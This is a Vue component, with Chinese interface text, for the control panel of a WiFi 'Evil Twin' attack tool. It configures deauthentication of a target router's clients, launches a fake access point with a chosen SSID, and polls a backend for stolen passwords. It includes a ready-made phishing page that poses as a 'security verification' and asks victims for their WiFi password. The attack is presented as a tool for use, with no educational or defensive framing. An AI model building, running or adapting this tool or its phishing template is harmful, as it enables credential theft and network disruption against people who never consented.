<template>
  <div class="min-h-screen bg-[#0b1120] text-gray-300 p-6 flex flex-col font-mono">
    
    <header class="bg-[#1f2937] border border-gray-700 rounded-xl p-4 mb-6 shadow-lg flex justify-between items-center">
      <div class="flex items-center gap-3">
        <span class="text-2xl text-purple-400">😈</span>
        <h1 class="text-xl font-bold text-white tracking-wider">Evil Twin 双子攻击配置</h1>
      </div>
      <button @click="$router.push('/')" class="px-4 py-2 border border-gray-600 rounded hover:bg-gray-700 text-sm">返回首页</button>
    </header>

    <div class="flex-1 grid grid-cols-12 gap-6">
      
      <div class="col-span-5 space-y-6">
        <div class="bg-[#1f2937] border border-gray-700 rounded-xl p-6 shadow-lg">
          <h3 class="text-purple-400 font-bold mb-4 border-b border-gray-700 pb-2 flex items-center gap-2">
            <span>⚙️ 攻击参数</span>
            <span class="text-[10px] bg-red-900/30 text-red-400 px-2 rounded">需要两张网卡</span>
          </h3>
          
          <div class="space-y-4">
            <div class="grid grid-cols-2 gap-4">
              <div>
                <label class="block text-xs text-gray-500 mb-1">攻击网卡 (Deauth)</label>
                <input v-model="form.interface" placeholder="例如 wlan0" class="w-full bg-black/30 border border-gray-600 rounded px-3 py-2 text-sm text-gray-300 focus:border-purple-500 outline-none">
              </div>
              <div>
                <label class="block text-xs text-gray-500 mb-1">AP 网卡 (Hotspot)</label>
                <input v-model="form.ap_interface" placeholder="例如 wlan1" class="w-full bg-black/30 border border-gray-600 rounded px-3 py-2 text-sm text-gray-300 focus:border-purple-500 outline-none">
              </div>
            </div>

            <div>
              <label class="block text-xs text-gray-500 mb-1">攻击目标 BSSID (MAC)</label>
              <input v-model="form.bssid" placeholder="目标路由器的 MAC 地址" class="w-full bg-black/30 border border-gray-600 rounded px-3 py-2 text-sm text-gray-300 focus:border-purple-500 outline-none font-mono">
            </div>

            <div class="grid grid-cols-2 gap-4">
              <div>
                <label class="block text-xs text-gray-500 mb-1">伪造 SSID 名称</label>
                <input v-model="form.ssid" placeholder="例如 Free_WiFi" class="w-full bg-black/30 border border-gray-600 rounded px-3 py-2 text-sm text-gray-300 focus:border-purple-500 outline-none">
              </div>
              <div>
                <label class="block text-xs text-gray-500 mb-1">信道 (Channel)</label>
                <input v-model="form.channel" placeholder="1-13" class="w-full bg-black/30 border border-gray-600 rounded px-3 py-2 text-sm text-gray-300 focus:border-purple-500 outline-none">
              </div>
            </div>

            <div>
              <label class="block text-xs text-gray-500 mb-1">钓鱼页面 HTML 模板</label>
              <textarea v-model="form.template_html" rows="6" class="w-full bg-black/30 border border-gray-600 rounded px-3 py-2 text-xs text-green-400 font-mono focus:border-purple-500 outline-none resize-none" placeholder="输入 HTML 代码..."></textarea>
              <div class="text-[10px] text-gray-500 mt-1 cursor-pointer hover:text-white" @click="useDefaultTemplate">👉 点击填入默认模板</div>
            </div>

            <div class="pt-2">
              <button v-if="!isRunning" @click="startAttack" class="w-full py-3 bg-purple-700 hover:bg-purple-600 text-white font-bold rounded shadow-lg transition flex justify-center items-center gap-2">
                <span>🚀</span> 启动双子攻击
              </button>
              <button v-else @click="stopAttack" class="w-full py-3 bg-red-600 hover:bg-red-500 text-white font-bold rounded shadow-lg animate-pulse flex justify-center items-center gap-2">
                <span>⏹</span> 停止攻击 & 恢复网络
              </button>
            </div>
          </div>
        </div>
      </div>

      <div class="col-span-7 flex flex-col gap-6">
        
        <div class="bg-[#1f2937] border border-gray-700 rounded-xl p-6 shadow-lg flex-1 flex flex-col min-h-[300px]">
          <h3 class="text-green-400 font-bold mb-4 border-b border-gray-700 pb-2 flex justify-between items-center">
            <span>🔑 实时捕获凭证 (Credentials)</span>
            <span v-if="isRunning" class="text-xs animate-pulse text-green-500">● 监听中...</span>
          </h3>
          
          <div class="flex-1 overflow-y-auto custom-scrollbar bg-black/30 rounded border border-gray-700 p-4">
            <div v-if="capturedCreds.length === 0" class="h-full flex flex-col items-center justify-center text-gray-600">
              <span class="text-4xl mb-2">🕸️</span>
              <p>等待鱼儿上钩...</p>
            </div>
            <div v-else class="space-y-2">
              <div v-for="(cred, index) in capturedCreds" :key="index" class="bg-green-900/20 border border-green-500/30 p-3 rounded text-green-300 font-mono text-sm break-all animate-fade-in">
                <span class="text-green-500 font-bold mr-2">[捕获成功]</span> {{ cred }}
              </div>
            </div>
          </div>
        </div>

        <div class="bg-black rounded-xl border border-gray-700 p-4 h-48 flex flex-col font-mono text-xs shadow-inner">
          <div class="text-gray-500 border-b border-gray-800 pb-1 mb-1">系统日志</div>
          <div class="flex-1 overflow-y-auto space-y-1 custom-scrollbar" ref="logRef">
            <div v-for="(log, i) in logs" :key="i" class="text-gray-400">
              <span class="text-purple-500">➜</span> {{ log }}
            </div>
          </div>
        </div>

      </div>
    </div>
  </div>
</template>

<script setup>
import { ref, onUnmounted, nextTick } from 'vue'
import api from '@/api'
import { ElMessage } from 'element-plus'

const isRunning = ref(false)
const logs = ref(['[SYSTEM] Ready to configure Evil Twin attack.'])
const capturedCreds = ref([])
const logRef = ref(null)
let pollTimer = null

// 表单数据
const form = ref({
  interface: 'wlan0',      // 攻击卡
  ap_interface: 'wlan1',   // 钓鱼卡
  bssid: '',
  ssid: 'Free_WiFi',
  channel: '6',
  duration: 300,
  template_html: ''
})

// 默认模板
const useDefaultTemplate = () => {
  form.value.template_html = `<html>
<head><meta name="viewport" content="width=device-width, initial-scale=1"></head>
<body style="background:#f0f2f5;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;">
  <div style="background:white;padding:2rem;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);text-align:center;width:90%;max-width:350px;">
    <h2 style="color:#333;margin-bottom:1rem;">安全验证</h2>
    <p style="color:#666;font-size:0.9rem;margin-bottom:1.5rem;">由于网络安全升级，请验证您的 WiFi 密码以继续上网。</p>
    <form method="POST">
      <input type="password" name="password" placeholder="请输入 WiFi 密码" style="width:100%;padding:10px;margin-bottom:1rem;border:1px solid #ddd;border-radius:4px;box-sizing:border-box;">
      <button style="width:100%;padding:10px;background:#1890ff;color:white;border:none;border-radius:4px;font-weight:bold;cursor:pointer;">立即验证</button>
    </form>
  </div>
</body>
</html>`
}

// 自动滚动日志
const addLog = (msg) => {
  logs.value.push(msg)
  nextTick(() => { if (logRef.value) logRef.value.scrollTop = logRef.value.scrollHeight })
}

// 启动攻击
const startAttack = async () => {
  if (!form.value.bssid) return ElMessage.warning("请填写目标 BSSID")
  if (!form.value.template_html) useDefaultTemplate()

  addLog(`[CMD] Starting Evil Twin Attack on target: ${form.value.bssid}`)
  
  try {
    const res = await api.post('/attack/eviltwin/start', form.value)
    if (res.data.status === 'started') {
      isRunning.value = true
      addLog(`[SUCCESS] Fake AP started on ${form.value.ap_interface}`)
      addLog(`[SUCCESS] Deauth started on ${form.value.interface}`)
      ElMessage.success("攻击已启动！请观察右侧捕获区")
      
      // 开始轮询密码
      pollTimer = setInterval(fetchCreds, 3000)
    }
  } catch (e) {
    addLog(`[ERROR] Start failed: ${e.message}`)
    ElMessage.error(e.message)
  }
}

// 停止攻击
const stopAttack = async () => {
  try {
    await api.post('/attack/eviltwin/stop')
    isRunning.value = false
    addLog("[CMD] Attack stopped. Network interface restored.")
    if (pollTimer) clearInterval(pollTimer)
  } catch (e) {
    ElMessage.error("停止失败")
  }
}

// 轮询凭证
const fetchCreds = async () => {
  try {
    const res = await api.get('/attack/eviltwin/credentials')
    if (res.data.status === 'success' && res.data.data.length > 0) {
      // 简单的去重逻辑
      res.data.data.forEach(c => {
        if (!capturedCreds.value.includes(c)) {
          capturedCreds.value.push(c)
          ElMessage.success("🔥 捕获到新的密码！")
        }
      })
    }
  } catch (e) {}
}

onUnmounted(() => {
  if (pollTimer) clearInterval(pollTimer)
})
</script>

<style scoped>
.custom-scrollbar::-webkit-scrollbar { width: 6px; }
.custom-scrollbar::-webkit-scrollbar-track { background: #1f2937; }
.custom-scrollbar::-webkit-scrollbar-thumb { background: #4b5563; border-radius: 4px; }
.animate-fade-in { animation: fadeIn 0.5s ease-out; }
@keyframes fadeIn { from { opacity: 0; transform: translateY(-5px); } to { opacity: 1; transform: translateY(0); } }
</style>